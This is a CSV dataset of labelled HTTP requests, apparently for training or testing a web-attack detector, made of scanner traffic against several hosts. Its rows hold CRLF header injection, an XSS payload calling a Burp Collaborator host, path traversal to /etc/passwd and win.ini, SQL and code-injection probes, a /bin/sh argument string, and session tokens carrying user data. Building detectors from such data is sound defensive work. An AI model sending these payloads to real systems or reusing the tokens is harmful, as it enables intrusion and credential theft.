id,method,user_agent,url,refer,body,lable
279,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/socket.io/?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2ff8o3vpudxv8s4qvh7cl5kes1asgl4msej2dp3dsX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,,"GET /socket.io/?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2ff8o3vpudxv8s4qvh7cl5kes1asgl4msej2dp3dsX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy  ",4
201,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/suports/socket.io/polyfills.js%3e%0d%0aBCC%3a5pvv0uucl8zdl0r7i9nzfg94nvtrhv5nzbq3dt1i@burpcollaborator.net%0d%0ango%3a%20w,,"GET /suports/socket.io/polyfills.js%3e%0d%0aBCC%3a5pvv0uucl8zdl0r7i9nzfg94nvtrhv5nzbq3dt1i@burpcollaborator.net%0d%0ango%3a%20w HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu1kAMsPNZBsGuvDmXWOlAf9RrSWN8pmEwU_A; continueCode=QVJ9b62p1OWXjLloAOYhrUzTKiPQHbYS1LfbZhbqTPnGNnMxgwKeZR735zkv  ",4
748,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~400~appoint~auth~%0d%0a%20SomeCustomInjectedHeader:%20injected_by_wvs~identify~main~print~sign~signature~template.8cd81fe93872e5162f62.js,http://124.70.151.147:9180/,"GET /assets/js/default~-1'%20OR%202+928-928-1=0+0+0+1%20--%20~appoint~auth~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js HTTP/1.1 X-Requested-With: XMLHttpRequest Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/default~404~appoint~%E5%98%8A%E5%98%8D%0ASomeCustomInjectedHeader:%20injected_by_wvs~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))~404~appoint~auth~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js HTTP/1.1 Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/default~400~appoint~auth~%0d%0a%20SomeCustomInjectedHeader:%20injected_by_wvs~identify~main~print~sign~signature~template.8cd81fe93872e5162f62.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
810,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~%0d%0a%09SomeCustomInjectedHeader:%20injected_by_wvs~signature.e945fe21d19b897933f3.js,http://124.70.151.147:9180/,"GET /assets/js/default~%0d%0a%09SomeCustomInjectedHeader:%20injected_by_wvs~signature.e945fe21d19b897933f3.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
270,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/assets/public/images/products/apple_pressings.jpg%3e%0d%0aBCC%3ajzm2da7ba5vbngzdi7cbrqmpdgj978v0pogg36rv@burpcollaborator.net%0d%0avzj%3a%20q,http://121.4.111.58:3000/,"GET /assets/public/images/products/apple_pressings.jpg%3e%0d%0aBCC%3ajzm2da7ba5vbngzdi7cbrqmpdgj978v0pogg36rv@burpcollaborator.net%0d%0avzj%3a%20q HTTP/1.1 Host: 121.4.111.58:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu1kAMsPNZBsGuvDmXWOlAf9RrSWN8pmEwU_A; continueCode=QVJ9b62p1OWXjLloAOYhrUzTKiPQHbYS1LfbZhbqTPnG",4
631,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/examples/async//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd,,"GET /examples/async//.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd HTTP/1.1 Cookie: JSESSIONID=1A9FC34C37FDB71299F3B59EAA2809F9 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9501 Connection: Keep-alive  GET /examples/async//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1 Cookie: JSESSIONID=1A9FC34C37FDB71299F3B59EAA2809F9 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9501 Connection: Keep-alive  ",4
835,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~500~appoint~auth~detail~identify~main~%0d%0a%09SomeCustomInjectedHeader:%20injected_by_wvs~sign~signature~template.967292fd97008e6eb1ac.js,http://124.70.151.147:9180/,"POST /risk/user/create?_=1641279351111 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br Content-Length: 58 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  bizId=../../../../../../../../../../windows/win.ini%00.jpgPOST /captcha/prepare?_=%24%7B%40print(md5(31337))%7D HTTP/1.1 Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br Content-Length: 0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /sys/config/oss?_=1641279319901&keys=-1%20OR%202%2B652-652-1=0%2B0%2B0%2B1%20--%20 HTTP/1.1 X-Requested-With: XMLHttpRequest Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/default~500~appoint~auth~detail~identify~main~%0d%0a%09SomeCustomInjectedHeader:%20injected_by_wvs~sign~signature~template.967292fd97008e6eb1ac.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs/js/default~404~appoint~auth~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
406,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/socket.io/?EIO=4&transport=websocket&sid=q6m0fgnIn0y7HfUFAAAM%0d%0aBCC%3aevd2iohckuvrrpigub847df0xr3krofg84zrrfg@burpcollaborator.net%0d%0abdt%3a%20x,,"GET /socket.io/?EIO=4&transport=websocket&sid=q6m0fgnIn0y7HfUFAAAM%0d%0aBCC%3aevd2iohckuvrrpigub847df0xr3krofg84zrrfg@burpcollaborator.net%0d%0abdt%3a%20x HTTP/1.1 Host: 121.4.111.58:3000 Connection: Upgrade Pragma: no-cache Cache-Control: no-cache User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Upgrade: websocket Origin: http://121.4.111.58:3000 Sec-WebSocket-Version: 13 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy Sec-WebSocket-Key: vYPLzqwvJvMUYrmF+mALxA==  ",4
102,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/console/%20HTTP/1.1%0d%0aHost:%20weblogic_plugin_http_injection.nasl%0d%0aX-Nessus:%20/index.jsp,,,4
387,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/assets/public/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/dq7w44y51zm5eaq79135ikdj4aa3yurij976uyinX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/products/permafrost.jpg,http://121.4.111.58:3000/,"GET /assets/public/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/dq7w44y51zm5eaq79135ikdj4aa3yurij976uyinX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/products/permafrost.jpg HTTP/1.1 Host: 121.4.111.58:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kL",4
204,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/suports/socket.io/?EIO=4&transport=polling%0d%0aBCC%3am2pcdb7typcuyh4ovq0gsxml0c68uai2bq2dt1i@burpcollaborator.net%0d%0anzb%3a%20b&t=N-7XL6w,http://121.4.111.58:3000/suports,"GET /suports/socket.io/?EIO=4&transport=polling%0d%0aBCC%3am2pcdb7typcuyh4ovq0gsxml0c68uai2bq2dt1i@burpcollaborator.net%0d%0anzb%3a%20b&t=N-7XL6w HTTP/1.1 Host: 121.4.111.58:3000 Accept: */* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Referer: http://121.4.111.58:3000/suports Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu1kAMsPNZBsGuvDmXWOlAf9RrSWN8pmEwU_A; continueCode=QVJ9b62p1OWXjLloAOYhrUzTKiPQHbYS1LfbZhbqTPnGNnMxgwKeZR735zkv Connection: close  ",4
149,GET,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",/?arg=-n&arg=reward&arg=reward-api-9715ea-6878c7c78d-2rttz&arg=-c&arg=reward-web-new&arg=env&arg=COLUMNS=1920&arg=LINES=1080&arg=/bin/sh&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTg4MjA0ODksImlzcyI6IjEyMDAwNTc1MzcifQ.CZZc0HRNmInRD2IWiSIJkc3r7FYQ7LqGqS9VEZheAvE,,,4
128,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0,/kcbtbStatusAction.do?_=1654510058666&auditApplyDateBegin=&auditApplyDateEnd=&commitiResult=&csrcCode=&currStatus=&isPagination=true&jsonCallBack=jsonpCallback75460&keyword=&order=updateDate%7Cdesc&pageHelp.beginPage=1&pageHelp.endPage=1&pageHelp.pageNo=1&pageHelp.pageSize=5%0D%0ACRLF-Header%3ACRLF-Value&registeResult=&sqlId=GP_KCBTB_XMLB,http://star.sse.com.cn/,"GET /kcbtbStatusAction.do?_=1654510058666&auditApplyDateBegin=&auditApplyDateEnd=&commitiResult=&csrcCode=&currStatus=&isPagination=true&jsonCallBack=jsonpCallback75460&keyword=&order=updateDate%7Cdesc&pageHelp.beginPage=1&pageHelp.endPage=1&pageHelp.pageNo=1&pageHelp.pageSize=5%0D%0ACRLF-Header%3ACRLF-Value&registeResult=&sqlId=GP_KCBTB_XMLB HTTP/1.1 Host: query.sse.com.cn User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: zh-CN,zh;q=0.9 Cookie: yfx_c_g_u_id_10000042=_ck22060618074012331734318810553; yfx_f_l_v_t_10000042=f_t_1654510060234__r_t_1654510060234__v_t_1654510060234__r_c_0 Referer: http://star.sse.com.cn/ Accept-Encoding: gzip  ",4
819,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~404~appoint~auth~detail~identify~%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs~print~sign~signature~template.1e25895209c51ce48c4e.js,http://124.70.151.147:9180/,"GET /assets/response.write(9507524*9458085)/default~404~appoint~auth~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js HTTP/1.1 Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/default~404~appoint~auth~detail~identify~%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs~print~sign~signature~template.1e25895209c51ce48c4e.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
